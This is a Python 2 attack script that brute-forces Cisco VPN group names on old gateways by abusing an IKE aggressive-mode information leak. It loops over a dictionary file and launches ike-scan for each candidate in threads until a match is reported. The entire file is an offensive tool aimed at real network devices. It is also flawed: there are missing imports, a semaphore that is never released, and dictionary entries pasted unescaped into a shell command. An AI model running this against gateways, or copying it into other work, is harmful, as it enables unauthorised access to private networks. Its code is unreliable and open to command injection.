#!/usr/bin/env python
# -*- coding: utf-8 -*

'''
Small python script to brute force Cisco Group name
in old Cisco VPN Gateway (info leaks in aggressive mode)
http://www.cisco.com/en/US/products/csr/cisco-sr-20101124-vpn-grpname.html

todo : Ike-Scan --> scapy

'''

__author__ = "C4rt"
__date__ = "26/03/2013"
__version__ = "1.0"
__maintainer__ = "C4rt"
__email__ = "eric.c4rtman@gmail.com"
__status__ = "Production"

try:
    import sys
    import os
    import time
    import subprocess
    # from scapy.all import *
    import pexpect
    import optparse
    from threading import *
except ImportError, err:
    raise
    print >>sys.stderr, "[X] Unable to import : %s\n" % err
    sys.exit(1)

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connectISAKMP(host, passwd):
    global Stop
    global Fails
    try:
        conn_closed = '0 returned handshake'
        success = 'Dead peer Detection'
        # connStr = sr(send(IP(
        #    dst="host") / UDP() / ISAKMP(init_cookie=RandString(8), exch_type="aggressive") / ISAKMP_payload_SA(ID="passwd")))
        strg = "ike-scan -M --id='%s' -A %s" % (passwd, host)
        result = os.popen(strg).readlines()[2]
        print result
        if re.search(success, result):
            print '[+] Success! Password Found: ' + str(passwd)
            Stop = True
        if re.search(conn_closed, result):
            print '[-] Connection closed by remote host'
            Fails += 1
    except Exception, e:
        print "\n[-] Fail with " + str(passwd)
        exit()


def main():
    parser = optparse.OptionParser('usage %prog -H ' +
                                   '<target host> -d <dictionnary filename>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-d', dest='passFile', type='string', help='specify dictionnary with password')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passFile = options.passFile

    if os.geteuid() != 0:
        print "Please, run as root."
        exit()
    if host == None or passFile == None:
        print parser.usage
        exit(0)

    print "Brute Force: " + sys.argv[2]
    print "\nPress ctrl+c to exit."
    PF = open(passFile, 'r')
    for line in PF.readlines():
        password = line.strip('\r').strip('\n')
        print " Trying: " + password
        if Stop:
            print '[*] Exiting: Password Found.'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: ' +\
                'Too many connections closed.'
            print '[!] Adjust number of threads.'
            exit(0)
        connection_lock.acquire()
        print '[-] Testing password : ' + str(password)
        t = Thread(target=connectISAKMP,
                   args=(host, password))
        child = t.start()

if __name__ == "__main__":
    try:
        main()
    except:
        print "\n\n\n\n", traceback.format_exc()
